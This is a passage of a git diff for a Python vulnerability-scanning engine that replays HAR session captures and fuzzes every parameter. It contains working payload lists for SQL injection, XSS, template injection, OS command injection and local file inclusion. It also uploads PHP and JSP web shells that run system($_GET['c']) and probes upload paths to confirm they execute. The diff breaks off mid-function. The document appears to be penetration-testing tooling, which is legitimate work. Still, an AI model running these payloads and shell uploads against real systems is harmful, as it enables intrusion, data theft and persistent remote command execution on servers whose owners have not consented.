@@ -1,23 +1,90 @@
 #!/usr/bin/env python3
 """
-HAR-Based VAPT Engine for Vikramaditya Platform
-Performs comprehensive vulnerability testing using HAR-extracted data
+HAR-Based VAPT Engine for Vikramaditya Platform — v2
+Replays HAR session data, fuzzes ALL parameters (GET + POST), validates findings.
 """
 
 import json
+import re
 import requests
-import urllib3
 import time
-import io
+import urllib3
+from copy import deepcopy
 from datetime import datetime
 from typing import Dict, List, Optional
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urlparse, urlencode, parse_qs, urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# ── Payloads ──────────────────────────────────────────────────────────────────
+
+SQLI_ERROR = [
+    "' OR '1'='1",
+    "' OR '1'='1'--",
+    "admin'--",
+    "' UNION SELECT NULL FROM DUAL--",
+    "' UNION SELECT NULL,NULL FROM DUAL--",
+    "1' AND '1'='2",
+    "') OR ('1'='1",
+]
+SQLI_TIME_ORACLE = "' || dbms_pipe.receive_message('a',{delay}) || '"
+SQLI_TIME_MYSQL  = "' AND SLEEP({delay})-- "
+SQLI_TIME_MSSQL  = "'; WAITFOR DELAY '0:0:{delay}'--"
+
+SQL_ERROR_SIGS = [
+    r'ORA-\d{4,5}', r'quoted string not properly terminated',
+    r'SQL syntax.*MySQL', r'mysql_fetch', r'mysql_num_rows',
+    r'Unclosed quotation mark', r'ODBC SQL Server Driver',
+    r'Microsoft OLE DB', r'SQLite.*error', r'pg_query',
+    r'PSQLException', r'syntax error at or near',
+]
+
+XSS_PAYLOADS = [
+    '<script>alert("V1KR4M")</script>',
+    '"><img src=x onerror=alert("V1KR4M")>',
+    "';alert('V1KR4M');//",
+    '<svg/onload=alert("V1KR4M")>',
+    '{{7*7}}',
+    '${7*7}',
+]
+
+CMDI_PAYLOADS = ['; id', '| id', '$(id)', '`id`']
+
+LFI_PAYLOADS = [
+    '../../../etc/passwd',
+    '....//....//....//etc/passwd',
+    'php://filter/convert.base64-encode/resource=../include/set_env.php',
+]
+
+UPLOAD_SHELLS = {
+    'shell.php':      ('<?php echo "V1KR4M_RCE"; system($_GET["c"]); ?>', 'application/x-php'),
+    'shell.phtml':    ('<?php echo "V1KR4M_RCE"; system($_GET["c"]); ?>', 'application/x-httpd-php'),
+    'shell.php.jpg':  ('<?php echo "V1KR4M_RCE"; ?>', 'image/jpeg'),
+    'shell.jsp':      ('<%out.print("V1KR4M_RCE");%>', 'application/x-jsp'),
+}
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+_SQL_RE = [re.compile(p, re.I) for p in SQL_ERROR_SIGS]
+
+def _has_sql_error(text: str) -> Optional[str]:
+    for rx in _SQL_RE:
+        m = rx.search(text)
+        if m:
+            return m.group()
+    return None
+
+def _is_static(path: str) -> bool:
+    return bool(re.search(r'\.(js|css|png|jpg|gif|svg|woff2?|ttf|ico|mp3|map)(\?|$)', path, re.I))
+
+def _skip_params():
+    return {'els', 'ols', 'session_id', 'angular', 'output', 'jsversion',
+            'uitype', 'build_ver', 'tsoffset', 'offset_timezone', 'tzcode',
+            'timestamp', 'spendTime', 'compose_key'}
+
 
 class HARVAPTEngine:
-    """Comprehensive VAPT testing engine using HAR file data"""
+    """Replays HAR requests, fuzzes parameters, validates findings."""
 
     def __init__(self, har_analysis: Dict, output_dir: str = None):
         self.analysis = har_analysis
@@ -25,525 +92,583 @@ class HARVAPTEngine:
         self.endpoints = har_analysis.get('endpoints', [])
         self.attack_surface = har_analysis.get('attack_surface', {})
         self.config = har_analysis.get('config', {})
-        self.output_dir = output_dir or f"vapt_results_{int(time.time())}"
+        self.output_dir = output_dir
 
         self.session = requests.Session()
         self.session.verify = False
-        self.session.timeout = 30
-
-        # Configure session with authentication data
+        self.session.timeout = 20
         self._configure_session()
 
-        self.vulnerabilities = []
-        self.test_results = {}
+        self.vulnerabilities: List[Dict] = []
+        self.test_results: Dict = {}
+        self._tested = 0
+
+    # ── Session setup ─────────────────────────────────────────────────────
 
     def _configure_session(self):
-        """Configure requests session with authentication data"""
+        cookies = self.session_data.get('cookies', {})
+        for name, value in cookies.items():
+            self.session.cookies.set(name, value)
+        headers = self.session_data.get('headers', {})
+        if headers:
+            self.session.headers.update(headers)
+        self.session.headers.setdefault(
+            'User-Agent',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36')
 
-        # Set cookies
-        if self.session_data.get('cookies'):
-            for name, value in self.session_data['cookies'].items():
-                self.session.cookies.set(name, value)
+    # ── Logging ───────────────────────────────────────────────────────────
 
-        # Set headers
-        if self.session_data.get('headers'):
-            self.session.headers.update(self.session_data['headers'])
-
-        # Set User-Agent if not present
-        if 'User-Agent' not in self.session.headers:
-            self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-
-    def log_vulnerability(self, vuln_type: str, endpoint: str, details: str, severity: str = 'medium'):
-        """Log a discovered vulnerability"""
-        vulnerability = {
+    def _log(self, severity: str, vuln_type: str, url: str, detail: str,
+             evidence: str = "", param: str = "", payload: str = ""):
+        v = {
             'timestamp': datetime.now().isoformat(),
             'type': vuln_type,
-            'endpoint': endpoint,
-            'details': details,
             'severity': severity,
-            'method': 'har_vapt_engine'
+            'endpoint': url.split('?')[0],
+            'full_url': url[:500],
+            'details': detail,
+            'evidence': evidence[:500],
+            'parameter': param,
+            'payload': payload[:200],
         }
-        self.vulnerabilities.append(vulnerability)
-        print(f"🚨 [{severity.upper()}] {vuln_type}: {endpoint}")
-        print(f"   {details}")
+        self.vulnerabilities.append(v)
+        icon = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(severity, '⚪')
+        print(f"   {icon} [{severity.upper()}] {vuln_type}: {url.split('?')[0]}")
+        print(f"      {detail[:120]}")
+
+    # ── Collect fuzzable targets from HAR ─────────────────────────────────
+
+    def _fuzzable_endpoints(self) -> List[Dict]:
+        """Return POST/GET endpoints that have parameters and are not static."""
+        targets = []
+        skip = _skip_params()
+        for ep in self.endpoints:
+            if _is_static(ep.get('path', '')):
+                continue
+            if ep.get('status_code', 0) in (0, 301, 302, 304, 404):
+                continue
+            fuzz_params = {}
+            for p, v in ep.get('post_params', {}).items():
+                if p.lower() not in skip and p not in ('login',):
+                    fuzz_params[p] = v[0] if isinstance(v, list) and v else str(v)
+            for p, v in ep.get('query_params', {}).items():
+                if p.lower() not in skip and p not in ('login',):
+                    fuzz_params[p] = v[0] if isinstance(v, list) and v else str(v)
+            if fuzz_params:
+                targets.append({**ep, '_fuzz_params': fuzz_params})
+        return targets
+
+    def _real_upload_endpoints(self) -> List[Dict]:
+        """Return only endpoints that actually had multipart file uploads in the HAR."""
+        return [ep for ep in self.endpoints
+                if ep.get('has_file_upload') and ep.get('method') in ('POST', 'PUT')]
+
+    def _auth_endpoints(self) -> List[Dict]:
+        """Return endpoints that serve dynamic content and should require auth."""
+        out = []
+        for ep in self.endpoints:
+            if _is_static(ep.get('path', '')):
+                continue
+            if ep.get('method') != 'POST':
+                continue
+            if ep.get('status_code', 0) != 200:
+                continue
+            ct = ep.get('content_type', '')
+            if 'json' in ct or 'html' in ct:
+                out.append(ep)
+        return out
+
+    # ── SQL Injection ─────────────────────────────────────────────────────
 
     def test_sql_injection(self) -> Dict:
-        """Test for SQL injection vulnerabilities"""
-        print("\n🧪 Testing SQL Injection...")
+        print("\n🧪 SQL Injection (error + time-based on ALL POST/GET params)...")
+        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
+        targets = self._fuzzable_endpoints()
+        print(f"   Targets: {len(targets)} endpoints with fuzzable params")
 
-        results = {
-            'tested_endpoints': 0,
-            'vulnerable_endpoints': [],
-            'payloads_tested': 0
-        }
+        for ep in targets:
+            url = ep['url']
+            method = ep['method']
+            base_params = dict(ep.get('post_params', {}))
+            # flatten list values
+            for k, v in base_params.items():
+                if isinstance(v, list):
+                    base_params[k] = v[0]
 
-        sql_payloads = [
-            "' OR '1'='1",
-            "' OR '1'='1'--",
-            "' UNION SELECT 1,1,1--",
-            "'; WAITFOR DELAY '00:00:05'--",
-            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
-            "') OR '1'='1'--"
-        ]
-
-        for endpoint in self.endpoints:
-            if not endpoint.get('vulnerability_indicators') or 'sqli_param' not in endpoint['vulnerability_indicators']:
-                continue
-
-            results['tested_endpoints'] += 1
-            endpoint_url = endpoint['url']
-            method = endpoint['method']
-
-            # Test GET parameters
-            for param, values in endpoint.get('query_params', {}).items():
-                for payload in sql_payloads:
+            for param, orig_val in ep['_fuzz_params'].items():
+                # ── Error-based ──
+                for payload in SQLI_ERROR:
                     results['payloads_tested'] += 1
-
-                    # Create test URL with SQL injection payload
-                    test_url = endpoint_url.replace(f"{param}={values[0]}", f"{param}={payload}")
-
+                    test_params = {**base_params, param: payload}
                     try:
-                        response = self.session.get(test_url)
-
-                        # Check for SQL injection indicators
-                        content = response.text.lower()
-                        sql_errors = ['mysql_', 'sql syntax', 'ora-', 'sqlite_error', 'postgresql']
-
-                        if any(error in content for error in sql_errors):
-                            self.log_vulnerability(
-                                'SQL Injection - Error Based',
-                                test_url,
-                                f"SQL error detected in parameter '{param}' with payload: {payload}",
-                                'critical'
-                            )
-                            results['vulnerable_endpoints'].append(endpoint_url)
+                        if method == 'POST':
+                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
+                        else:
+                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
+                        match = _has_sql_error(r.text)
+                        if match:
+                            self._log('critical', 'SQL Injection (Error)', url,
+                                      f"DB error '{match}' in param '{param}'",
+                                      evidence=r.text[:300], param=param, payload=payload)
+                            results['vulnerable'].append(url)
                             break
+                    except Exception:
+                        pass
 
-                        # Check for time-based injection (simplified)
-                        if 'WAITFOR' in payload:
-                            start_time = time.time()
-                            response = self.session.get(test_url)
-                            response_time = time.time() - start_time
+                # ── Time-based ──
+                for tpl in [SQLI_TIME_ORACLE, SQLI_TIME_MYSQL, SQLI_TIME_MSSQL]:
+                    results['payloads_tested'] += 1
+                    delay = 5
+                    payload = tpl.format(delay=delay)
+                    test_params = {**base_params, param: payload}
+                    try:
+                        t0 = time.time()
+                        if method == 'POST':
+                            self.session.post(url.split('?')[0], data=test_params, timeout=delay + 10)
+                        else:
+                            self.session.get(url.split('?')[0], params=test_params, timeout=delay + 10)
+                        elapsed = time.time() - t0
+                        if elapsed >= delay - 0.5:
+                            # Confirm with a shorter delay
+                            payload2 = tpl.format(delay=1)
+                            test_params2 = {**base_params, param: payload2}
+                            t1 = time.time()
+                            if method == 'POST':
+                                self.session.post(url.split('?')[0], data=test_params2, timeout=12)
+                            else:
+                                self.session.get(url.split('?')[0], params=test_params2, timeout=12)
+                            elapsed2 = time.time() - t1
+                            if elapsed >= delay - 0.5 and elapsed2 < delay - 0.5:
+                                self._log('critical', 'SQL Injection (Time-Based)', url,
+                                          f"Delay {elapsed:.1f}s with {delay}s, {elapsed2:.1f}s with 1s in param '{param}'",
+                                          param=param, payload=payload)
+                                results['vulnerable'].append(url)
+                    except Exception:
+                        pass
 
-                            if response_time > 5:
-                                self.log_vulnerability(
-                                    'SQL Injection - Time Based',
-                                    test_url,
-                                    f"Time delay detected ({response_time:.2f}s) in parameter '{param}'",
-                                    'critical'
-                                )
-                                results['vulnerable_endpoints'].append(endpoint_url)
-                                break
-
-                        # Check for union-based injection (response size difference)
-                        if len(response.content) > 50000:  # Large response might indicate UNION success
-                            self.log_vulnerability(
-                                'SQL Injection - Union Based',
-                                test_url,
-                                f"Large response ({len(response.content)} bytes) suggests UNION injection in '{param}'",
-                                'critical'
-                            )
-                            results['vulnerable_endpoints'].append(endpoint_url)
-                            break
-
-                    except Exception as e:
-                        print(f"   ❌ Error testing {test_url}: {e}")
+            results['tested'] += 1
 
         self.test_results['sql_injection'] = results
         return results
 
-    def test_file_upload_rce(self) -> Dict:
-        """Test file upload endpoints for RCE vulnerabilities"""
-        print("\n🧪 Testing File Upload RCE...")
-
-        results = {
-            'tested_endpoints': 0,
-            'vulnerable_endpoints': [],
-            'uploaded_files': []
-        }
-
-        # Malicious file payloads
-        malicious_files = {
-            'php_shell.php': {
-                'content': '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>',
-                'mime': 'application/x-php'
-            },
-            'test.phtml': {
-                'content': '<?php system($_GET["c"]); ?>',
-                'mime': 'application/x-httpd-php'
-            },
-            'image.php.jpg': {
-                'content': '<?php phpinfo(); ?>',
-                'mime': 'image/jpeg'
-            },
-            'shell.jsp': {
-                'content': '<%@ page import="java.io.*" %><% if(request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>',
-                'mime': 'application/x-jsp'
-            }
-        }
-
-        for endpoint in self.attack_surface.get('file_uploads', []):
-            if endpoint['method'] not in ['POST', 'PUT']:
-                continue
-
-            results['tested_endpoints'] += 1
-            endpoint_url = endpoint['url']
-
-            for filename, file_data in malicious_files.items():
-                try:
-                    # Prepare file upload
-                    files = {
-                        'file': (filename, file_data['content'], file_data['mime']),
-                        'bulk_add_user': (filename, file_data['content'], file_data['mime'])  # Common parameter name
-                    }
-
-                    # Try different file parameter names
-                    for param_name in ['file', 'upload', 'document', 'bulk_add_user']:
-                        test_files = {param_name: (filename, file_data['content'], file_data['mime'])}
-
-                        response = self.session.post(endpoint_url, files=test_files)
-
-                        if response.status_code == 200:
-                            # Check for upload success indicators
-                            content = response.text.lower()
-                            success_indicators = ['success', 'uploaded', 'saved', 'complete']
-
-                            if any(indicator in content for indicator in success_indicators):
-                                self.log_vulnerability(
-                                    'File Upload RCE',
-                                    endpoint_url,
-                                    f"Malicious file '{filename}' uploaded successfully via parameter '{param_name}'",
-                                    'critical'
-                                )
-                                results['vulnerable_endpoints'].append(endpoint_url)
-                                results['uploaded_files'].append({
-                                    'filename': filename,
-                                    'endpoint': endpoint_url,
-                                    'parameter': param_name
-                                })
-
-                except Exception as e:
-                    print(f"   ❌ Error testing file upload {endpoint_url}: {e}")
-
-        self.test_results['file_upload_rce'] = results
-        return results
-
-    def test_authentication_bypass(self) -> Dict:
-        """Test for authentication bypass vulnerabilities"""
-        print("\n🧪 Testing Authentication Bypass...")
-
-        results = {
-            'tested_endpoints': 0,
-            'vulnerable_endpoints': [],
-            'bypass_methods': []
-        }
-
-        # Create unauthenticated session
-        unauth_session = requests.Session()
-        unauth_session.verify = False
-        unauth_session.timeout = 30
-        unauth_session.headers['User-Agent'] = self.session.headers.get('User-Agent', '')
-
-        for endpoint in self.attack_surface.get('admin_endpoints', []):
-            results['tested_endpoints'] += 1
-            endpoint_url = endpoint['url']
-
-            try:
-                # Test 1: No authentication
-                response = unauth_session.get(endpoint_url)
-
-                if response.status_code == 200 and len(response.content) > 1000:
-                    # Check for admin content
-                    content = response.text.lower()
-                    admin_indicators = ['admin', 'dashboard', 'management', 'users', 'settings']
-
-                    if any(indicator in content for indicator in admin_indicators):
-                        self.log_vulnerability(
-                            'Authentication Bypass',
-                            endpoint_url,
-                            'Admin endpoint accessible without authentication',
-                            'high'
-                        )
-                        results['vulnerable_endpoints'].append(endpoint_url)
-                        results['bypass_methods'].append('no_authentication')
-
-                # Test 2: Invalid session tokens
-                invalid_session = requests.Session()
-                invalid_session.verify = False
-                invalid_session.timeout = 30
-                invalid_session.cookies.set('session_id', 'INVALID_TOKEN_12345')
-                invalid_session.cookies.set('login', 'hacker@evil.com')
-
-                response = invalid_session.get(endpoint_url)
-
-                if response.status_code == 200 and len(response.content) > 1000:
-                    self.log_vulnerability(
-                        'Weak Authentication',
-                        endpoint_url,
-                        'Endpoint accepts invalid session tokens',
-                        'medium'
-                    )
-                    results['vulnerable_endpoints'].append(endpoint_url)
-                    results['bypass_methods'].append('invalid_session')
-
-            except Exception as e:
-                print(f"   ❌ Error testing authentication bypass {endpoint_url}: {e}")
-
-        self.test_results['authentication_bypass'] = results
-        return results
-
-    def test_idor(self) -> Dict:
-        """Test for Insecure Direct Object Reference vulnerabilities"""
-        print("\n🧪 Testing IDOR...")
-
-        results = {
-            'tested_endpoints': 0,
-            'vulnerable_endpoints': [],
-            'enumeration_successful': []
-        }
-
-        # Test user enumeration endpoints
-        enumeration_endpoints = [ep for ep in self.endpoints if 'user' in ep['path'].lower()]
-
-        test_users = [
-            'test@example.com',
-            'admin@test.com',
-            'user@test.com',
-            'support@test.com',
-            '../admin',
-            '../../etc/passwd',
-            '1', '2', '3', '100'
-        ]
-
-        for endpoint in enumeration_endpoints:
-            if endpoint['method'] != 'GET':
-                continue
-
-            results['tested_endpoints'] += 1
-            endpoint_url = endpoint['url']
-            baseline_response = None
-
-            # Establish baseline
-            try:
-                baseline_response = self.session.get(endpoint_url)
-                baseline_size = len(baseline_response.content)
-            except Exception:
-                continue
-
-            # Test different user inputs
-            for test_user in test_users:
-                try:
-                    # Replace user parameter in URL
-                    test_url = endpoint_url
-                    for param, values in endpoint.get('query_params', {}).items():
-                        if 'user' in param.lower() or 'id' in param.lower():
-                            test_url = test_url.replace(f"{param}={values[0]}", f"{param}={test_user}")
-
-                    response = self.session.get(test_url)
-
-                    # Check for size differences indicating enumeration
-                    size_diff = len(response.content) - baseline_size
-
-                    if abs(size_diff) > 5:  # Significant size difference
-                        self.log_vulnerability(
-                            'IDOR - User Enumeration',
-                            test_url,
-                            f"Response size difference ({size_diff} bytes) indicates user enumeration possible",
-                            'medium'
-                        )
-                        results['vulnerable_endpoints'].append(endpoint_url)
-                        results['enumeration_successful'].append(test_user)
-
-                except Exception as e:
-                    print(f"   ❌ Error testing IDOR {test_url}: {e}")
-
-        self.test_results['idor'] = results
-        return results
+    # ── XSS ───────────────────────────────────────────────────────────────
 
     def test_xss(self) -> Dict:
-        """Test for Cross-Site Scripting vulnerabilities"""
-        print("\n🧪 Testing XSS...")
+        print("\n🧪 XSS (reflected + SSTI on ALL params)...")
+        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
+        targets = self._fuzzable_endpoints()
 
-        results = {
-            'tested_endpoints': 0,
-            'vulnerable_endpoints': [],
-            'payloads_tested': 0
-        }
+        for ep in targets:
+            url = ep['url']
+            method = ep['method']
+            base_params = {k: (v[0] if isinstance(v, list) else v)
+                           for k, v in ep.get('post_params', {}).items()}
 
-        xss_payloads = [
-            '<script>alert("XSS")</script>',
-            '"><script>alert("XSS")</script>',
-            "';alert('XSS');//",
-            '<img src=x onerror=alert("XSS")>',
-            '<svg onload=alert("XSS")>',
-            'javascript:alert("XSS")'
-        ]
-
-        for endpoint in self.endpoints:
-            if not endpoint.get('query_params'):
-                continue
-
-            results['tested_endpoints'] += 1
-            endpoint_url = endpoint['url']
-
-            # Test GET parameters for XSS
-            for param, values in endpoint.get('query_params', {}).items():
-                for payload in xss_payloads:
+            for param in ep['_fuzz_params']:
+                for payload in XSS_PAYLOADS:
                     results['payloads_tested'] += 1
-
+                    test_params = {**base_params, param: payload}
                     try:
-                        test_url = endpoint_url.replace(f"{param}={values[0]}", f"{param}={payload}")
-                        response = self.session.get(test_url)
-
-                        # Check if payload is reflected in response
-                        if payload in response.text:
-                            self.log_vulnerability(
-                                'Cross-Site Scripting (XSS)',
-                                test_url,
-                                f"XSS payload reflected in parameter '{param}': {payload}",
-                                'high'
-                            )
-                            results['vulnerable_endpoints'].append(endpoint_url)
+                        if method == 'POST':
+                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
+                        else:
+                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
+                        body = r.text
+                        # Reflected XSS
+                        if payload in body:
+                            ctx = body[max(0, body.find(payload)-40):body.find(payload)+len(payload)+40]
+                            if 'value="' not in ctx and "value='" not in ctx:
+                                self._log('high', 'Reflected XSS', url,
+                                          f"Payload reflected in param '{param}'",
+                                          evidence=ctx, param=param, payload=payload)
+                                results['vulnerable'].append(url)
+                                break
+                        # SSTI
+                        if payload == '{{7*7}}' and '49' in body:
+                            self._log('critical', 'SSTI', url,
+                                      f"Template expression evaluated in param '{param}'",
+                                      param=param, payload=payload)
+                            results['vulnerable'].append(url)
                             break
-
-                    except Exception as e:
-                        print(f"   ❌ Error testing XSS {test_url}: {e}")
+                        if payload == '${7*7}' and '49' in body:
+                            self._log('critical', 'SSTI (EL)', url,
+                                      f"EL expression evaluated in param '{param}'",
+                                      param=param, payload=payload)
+                            results['vulnerable'].append(url)
+                            break
+                    except Exception:
+                        pass
+            results['tested'] += 1
 
         self.test_results['xss'] = results
         return results
 
+    # ── Command Injection ─────────────────────────────────────────────────
+
+    def test_command_injection(self) -> Dict:
+        print("\n🧪 Command Injection on ALL params...")
+        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
+        targets = self._fuzzable_endpoints()
+
+        for ep in targets:
+            url = ep['url']
+            method = ep['method']
+            base_params = {k: (v[0] if isinstance(v, list) else v)
+                           for k, v in ep.get('post_params', {}).items()}
+
+            for param in ep['_fuzz_params']:
+                for payload in CMDI_PAYLOADS:
+                    results['payloads_tested'] += 1
+                    test_params = {**base_params, param: payload}
+                    try:
+                        if method == 'POST':
+                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
+                        else:
+                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
+                        if re.search(r'uid=\d+\(', r.text):
+                            self._log('critical', 'Command Injection', url,
+                                      f"OS command output in param '{param}'",
+                                      evidence=r.text[:300], param=param, payload=payload)
+                            results['vulnerable'].append(url)
+                            break
+                    except Exception:
+                        pass
+            results['tested'] += 1
+
+        self.test_results['command_injection'] = results
+        return results
+
+    # ── LFI ───────────────────────────────────────────────────────────────
+
+    def test_lfi(self) -> Dict:
+        print("\n🧪 LFI / Path Traversal on ALL params...")
+        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
+        targets = self._fuzzable_endpoints()
+
+        for ep in targets:
+            url = ep['url']
+            method = ep['method']
+            base_params = {k: (v[0] if isinstance(v, list) else v)
+                           for k, v in ep.get('post_params', {}).items()}
+
+            for param in ep['_fuzz_params']:
+                for payload in LFI_PAYLOADS:
+                    results['payloads_tested'] += 1
+                    test_params = {**base_params, param: payload}
+                    try:
+                        if method == 'POST':
+                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
+                        else:
+                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
+                        if re.search(r'root:.*:0:0:|bin/bash|bin/sh', r.text):
+                            self._log('critical', 'Local File Inclusion', url,
+                                      f"/etc/passwd content in param '{param}'",
+                                      evidence=r.text[:300], param=param, payload=payload)
+                            results['vulnerable'].append(url)
+                            break
+                    except Exception:
+                        pass
+            results['tested'] += 1
+
+        self.test_results['lfi'] = results
+        return results
+
+    # ── File Upload ───────────────────────────────────────────────────────
+
+    def test_file_upload(self) -> Dict:
+        print("\n🧪 File Upload RCE (real multipart endpoints only)...")
+        results = {'tested': 0, 'vulnerable': [], 'uploaded': []}
+        upload_eps = self._real_upload_endpoints()
+        print(f"   Real upload endpoints: {len(upload_eps)}")
+
+        for ep in upload_eps:
+            url = ep['url']
+            results['tested'] += 1
+
+            # Extract the actual file param name from HAR postData
+            file_params = set()
+            # Check original HAR entry for param names (from postData.params)
+            for param_name in ep.get('post_params', {}).keys():
+                file_params.add(param_name)
+            if not file_params:
+                file_params = {'file', 'upload', 'upfile', 'upfile1'}
+
+            for fname, (content, mime) in UPLOAD_SHELLS.items():
+                for param in file_params:
+                    try:
+                        r = self.session.post(url, files={param: (fname, content, mime)}, timeout=20)
+                        body = r.text.lower()
+                        if r.status_code == 200 and 'success' in body:
+                            # VALIDATE: try to access the uploaded file
+                            parsed = urlparse(url)
+                            base = f"{parsed.scheme}://{parsed.netloc}"
+                            check_paths = [
+                                f"/upload/{fname}", f"/uploads/{fname}",
+                                f"/rcloud/file/{fname}", f"/files/{fname}",
+                                f"/tmp/{fname}", f"/attachments/{fname}",
+                            ]
+                            confirmed = False
+                            for cp in check_paths:
+                                try:
+                                    cr = self.session.get(f"{base}{cp}", timeout=10)
+                                    if 'V1KR4M_RCE' in cr.text:
+                                        self._log('critical', 'File Upload RCE (Confirmed)', url,
+                                                  f"Shell '{fname}' uploaded+accessible at {cp}",
+                                                  evidence=cr.text[:200], param=param)
+                                        results['vulnerable'].append(url)
+                                        results['uploaded'].append({'file': fname, 'path': cp})
+                                        confirmed = True
+                                        break
+                                    if cr.status_code == 200 and ('<?php' in cr.text or '<%' in cr.text):
+                                        self._log('high', 'File Upload (Stored, Not Executing)', url,
+                                                  f"Shell '{fname}' stored at {cp} but PHP disabled",
+                                                  param=param)
+                                        confirmed = True
+                                        break
+                                except Exception:
+                                    pass
+                            if not confirmed:
+                                # Upload accepted but can't find the file — medium
+                                self._log('medium', 'File Upload (Accepted, Unverified)', url,
+                                          f"Server accepted '{fname}' via '{param}' — cannot verify storage",
+                                          param=param)
+                    except Exception:
+                        pass
+
+        self.test_results['file_upload'] = results
+        return results
+
+    # ── Authentication Bypass ─────────────────────────────────────────────
+
+    def test_auth_bypass(self) -> Dict:
+        print("\n🧪 Authentication Bypass (dynamic endpoints only)...")
+        results = {'tested': 0, 'vulnerable': []}
+        auth_eps = self._auth_endpoints()
+        print(f"   Dynamic POST endpoints: {len(auth_eps)}")
+
+        unauth = requests.Session()
+        unauth.verify = False
+        unauth.timeout = 15
+        unauth.headers['User-Agent'] = self.session.headers.get('User-Agent', '')
+
+        for ep in auth_eps:
+            url = ep['url']
+            path = ep.get('path', '')
+            results['tested'] += 1
+
+            # Get authenticated baseline
+            try:
+                auth_r = self.session.post(url, data=ep.get('post_params', {}), timeout=15)
+                auth_size = len(auth_r.text)
+                auth_has_data = '"Success"' in auth_r.text or '"success"' in auth_r.text
+            except Exception:
+                continue
+
+            if not auth_has_data:
+                continue  # endpoint doesn't return success with auth — skip
+
+            # Test without cookies
+            try:
+                noauth_r = unauth.post(url, data=ep.get('post_params', {}), timeout=15)
+                if '"Success"' in noauth_r.text or '"success"' in noauth_r.text:
+                    # Verify it's not just a generic success page
+                    if abs(len(noauth_r.text) - auth_size) < 50:
+                        self._log('high', 'Authentication Bypass', url,
+                                  f"Endpoint returns authenticated data without session cookies",
+                                  evidence=noauth_r.text[:200])
+                        results['vulnerable'].append(url)
+            except Exception:
+                pass
+
+        self.test_results['auth_bypass'] = results
+        return results
+
+    # ── IDOR ──────────────────────────────────────────────────────────────
+
+    def test_idor(self) -> Dict:
+        print("\n🧪 IDOR (parameter manipulation)...")
+        results = {'tested': 0, 'vulnerable': []}
+        targets = self._fuzzable_endpoints()
+
+        # Find endpoints with user/id-like params
+        idor_targets = []
+        for ep in targets:
+            for param in ep['_fuzz_params']:
+                if any(x in param.lower() for x in ['user', 'login', 'email', 'id', 'uid', 'userid']):
+                    idor_targets.append((ep, param))
+
+        print(f"   IDOR targets: {len(idor_targets)} param/endpoint combos")
+
+        for ep, param in idor_targets:
+            url = ep['url']
+            method = ep['method']
+            base_params = {k: (v[0] if isinstance(v, list) else v)
+                           for k, v in ep.get('post_params', {}).items()}
+            results['tested'] += 1
+
+            # Get baseline
+            try:
+                if method == 'POST':
+                    base_r = self.session.post(url.split('?')[0], data=base_params, timeout=15)
+                else:
+                    base_r = self.session.get(url, timeout=15)
+                base_size = len(base_r.text)
+            except Exception:
+                continue
+
+            # Try different user values
+            for test_val in ['admin@test.com', 'test@test.com', 'user2@test.com', '1', '2', '999']:
+                test_params = {**base_params, param: test_val}
+                try:
+                    if method == 'POST':
+                        r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
+                    else:
+                        r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
+                    if '"Success"' in r.text and abs(len(r.text) - base_size) > 100:
+                        self._log('high', 'IDOR', url,
+                                  f"Different data returned for '{param}'={test_val} (delta {len(r.text)-base_size}b)",
+                                  evidence=r.text[:200], param=param)
+                        results['vulnerable'].append(url)
+                        break
+                except Exception:
+                    pass
+
+        self.test_results['idor'] = results
+        return results
+
+    # ── Header Security ───────────────────────────────────────────────────
+
+    def test_security_headers(self) -> Dict:
+        print("\n🧪 Security Header Audit...")
+        results = {'tested': 0, 'issues': []}
+
+        domains = self.attack_surface.get('domains', [])
+        required = {
+            'Strict-Transport-Security': 'Missing HSTS',
+            'X-Content-Type-Options': 'Missing X-Content-Type-Options',
+            'X-Frame-Options': 'Missing clickjacking protection',
+            'Content-Security-Policy': 'Missing CSP',
+        }
+
+        for domain in domains:
+            results['tested'] += 1
+            try:
+                r = self.session.get(f"https://{domain}/", timeout=10)
+                for hdr, msg in required.items():
+                    if hdr.lower() not in {k.lower() for k in r.headers}:
+                        self._log('low', 'Missing Security Header', f"https://{domain}/",
+                                  f"{msg} ({hdr})")
+                        results['issues'].append(f"{domain}: {msg}")
+
+                # Cookie audit
+                for cookie in r.cookies:
+                    issues = []
+                    if not cookie.secure:
+                        issues.append('no Secure flag')
+                    if 'httponly' not in str(cookie._rest).lower():
+                        issues.append('no HttpOnly')
+                    if issues:
+                        self._log('medium', 'Insecure Cookie', f"https://{domain}/",
+                                  f"Cookie '{cookie.name}': {', '.join(issues)}")
+
+                # TRACE method
+                try:
+                    tr = self.session.request('TRACE', f"https://{domain}/", timeout=10)
+                    if tr.status_code == 200 and 'TRACE' in tr.text:
+                        self._log('medium', 'HTTP TRACE Enabled', f"https://{domain}/",
+                                  "TRACE method reflects request headers (XST risk)")
+                except Exception:
+                    pass
+
+            except Exception:
+                pass
+
+        self.test_results['security_headers'] = results
+        return results
+
+    # ── Run All ───────────────────────────────────────────────────────────
+
     def run_comprehensive_scan(self) -> Dict:
-        """Run comprehensive vulnerability assessment"""
+        target = self.config.get('target_domain', 'Unknown')
+        fuzzable = self._fuzzable_endpoints()
+        uploads = self._real_upload_endpoints()
+
